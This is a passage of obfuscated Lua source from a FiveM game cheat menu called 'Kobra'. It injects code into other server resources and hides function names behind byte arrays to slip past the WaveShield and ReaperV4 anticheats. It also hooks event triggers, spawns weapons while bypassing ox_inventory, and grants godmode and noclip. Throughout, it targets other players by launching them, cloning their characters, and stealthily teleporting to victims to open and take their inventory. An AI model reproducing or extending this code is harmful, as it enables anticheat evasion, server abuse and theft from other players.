                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v248));break;end if (v1110==(95 -(9 + 86))) then v244:Notify("info","Kobra","Spawned Weapon Bypass #2",3000);MachoResourceStop("ox_inventory");v1110=422 -(275 + 146) ;end end end break;end end end;v12.GiveAllWeapons=function(v252) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v253) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v254,v255,v256) local v257=0 + 0 ;local v258;local v259;while true do if (v257==2) then v259=nil;function v259(v695,v696) local v697=64 -(29 + 35) ;local v698;local v699;while true do if ((0 -0)==v697) then v698={};v699=PlayerPedId();v697=2 -1 ;end if (v697==2) then return v698;end if (v697==1) then if  not v699 then return v698;end for v1026=0 -0 ,255 do local v1027=GetPlayerFromServerId(v1026);if (v1027 and (v1027~= -1) and DoesEntityExist(GetPlayerPed(v1027))) then local v1149=GetPlayerPed(v1027);local v1150=GetEntityCoords(v1149);if v1150 then local v1210= #(v695-v1150);if (v1210<=v696) then table.insert(v698,{player=v1027,serverId=v1026});end end end end v697=2;end end end v257=3;end if (v257==3) then CreateThread(function() local v700=GetPlayerFromServerId(v258);if ( not v700 or (v700== -(1 + 0))) then return;end local v701=GetPlayerPed(v700);if ( not v701 or  not DoesEntityExist(v701)) then return;end local v702=PlayerPedId();if  not v702 then return;end local v703=GetEntityCoords(v702);local v704=GetEntityCoords(v701);if ( not v703 or  not v704) then return;end local v705= #(v703-v704);local v706=false;local v707=nil;if (v705>10) then local v835=1012 -(53 + 959) ;local v836;local v837;local v838;local v839;local v840;while true do if (v835==4) then v706=true;Wait(100);break;end if (v835==0) then v707=v703;v836=math.random() * (410 -(312 + 96)) * math.pi ;v835=1 -0 ;end if (v835==2) then v839=math.sin(v836) * v837 ;v840=vector3(v704.x + v838 ,v704.y + v839 ,v704.z);v835=288 -(147 + 138) ;end if (v835==(900 -(813 + 86))) then v837=math.random(5,9 + 0 );v838=math.cos(v836) * v837 ;v835=3 -1 ;end if (v835==(495 -(18 + 474))) then SetEntityCoordsNoOffset(v702,v840.x,v840.y,v840.z,false,false,false);SetEntityVisible(v702,false,0 + 0 );v835=4;end end end local v708=v259(v704,v256);if ( #v708==0) then end ClearPedTasksImmediately(v702);for v765=3 -2 ,15 do if  not DoesEntityExist(v701) then break;end local v766=GetEntityCoords(v701);if  not v766 then break;end SetEntityCoords(v702,v766.x,v766.y,v766.z + 0.5 ,false,false,false,false);Wait(1136 -(860 + 226) );AttachEntityToEntityPhysically(v702,v701,0,0,303 -(121 + 182) ,0,19 + 131 ,1240 -(988 + 252) ,0 + 0 ,0,0 + 0 ,0,1,false,false,1971 -(49 + 1921) ,2);Wait(50);DetachEntity(v702,true,true);Wait(990 -(223 + 667) );end Wait(552 -(51 + 1) );ClearPedTasksImmediately(v702);if v707 then SetEntityCoords(v702,v707.x,v707.y,v707.z + (1 -0) ,false,false,false,false);Wait(214 -114 );SetEntityCoords(v702,v707.x,v707.y,v707.z,false,false,false,false);end if v706 then SetEntityVisible(v702,true,0);end end);break;end if (v257==1) then if  not v258 then return;end v256=v256 or (4125 -(146 + 979)) ;v257=1 + 1 ;end if (v257==(605 -(311 + 294))) then if ( not v255 or ( #v255==(0 -0))) then return;end v258=tonumber(v255[1]);v257=1 + 0 ;end end end;v12.HandleClonePlayer=function(v260,v261) if ( not v261 or ( #v261==(1443 -(496 + 947)))) then return;end local v262=table.concat(v261,",");MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v262));end;v12.HandleTakeInventory=function(v263,v264) local v265=0;local v266;local v267;while true do if (v265==(1358 -(1233 + 125))) then if ( not v264 or ( #v264==0)) then return;end v266=tonumber(v264[1]);v265=1 + 0 ;end if (v265==(1 + 0)) then if  not v266 then return;end print("Take Inventory action executed for players: "   .. table.concat(v264,", ") );v265=2;end if (v265==2) then v267=GetResourceState("WaveShield")=="started" ;if v267 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v266));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v266));end break;end end end;v12.BuildMenuFromWeaponList=function(v268,v269) local v270={};for v347,v348 in ipairs(v269) do if v46[v348] then v270[ #v270 + 1 + 0 ]=v46[v348].label;end end return v270;end;v12.GetWeaponModelFromLabel=function(v271,v272) local v273=0;while true do if (v273==(1645 -(963 + 682))) then for v709,v710 in pairs(v46) do if (v710.label==v272) then return v709;end end return "";end end end;v12.RepairVehicle=function(v274) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v93=GetResourceState("ReaperV4")=="started" ;local v94=GetResourceState("WaveShield")=="started" ;local v95=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v275) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v349={amigo=function() v48("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v48("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(1504 -(504 + 1000) ,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v95 then if v93 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() local v536=0 + 0 ;local v537;local v538;while true do if ((0 + 0)==v536) then print("2");v537=GetResourceState("WaveShield")=="started" ;v536=1 -0 ;end if (v536==1) then v538=GetResourceState("ReaperV4")=="started" ;if v537 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v538 then MachoInjectThread(0,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end break;end end end,["mc9-medicsystem"]=function() print("1");local v539=GetResourceState("WaveShield")=="started" ;local v540=GetResourceState("ReaperV4")=="started" ;if v539 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v540 then MachoInjectThread(0 + 0 ,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end end};for v541,v542 in pairs(v349) do if (GetResourceState(v541)=="started") then v542();end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=282 -(156 + 26) ,min=0 + 0 ,max=156 -56 ,step=165 -(149 + 15) ,onSelect=function(v350) SetEntityHealth(PlayerPedId(),v350 + (1060 -(890 + 70)) );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=582 -(14 + 468) ,min=0,max=219 -119 ,step=2 -1 ,onSelect=function(v351) SetPedArmour(PlayerPedId(),v351);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),22 + 78 );end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v352) v275:HandleGodmodeToggle(v352);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v353) if v353 then v275:EnableInvisibility();else v275:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=0.25 + 0 ,step=0.25 -0 ,min=0.25 + 0 ,max=56 -(12 + 39) ,onSelect=function(v354,v355) if v355 then local v605=0 + 0 ;while true do if (v605==0) then if  not v29 then local v1028=0;while true do if (v1028==(0 -0)) then v12:Notify("info","Kobra","Initializing... Please wait!",3561 -2561 );Wait(119 + 281 );v1028=1;end if (v1028==1) then v29=true;break;end end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v354   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
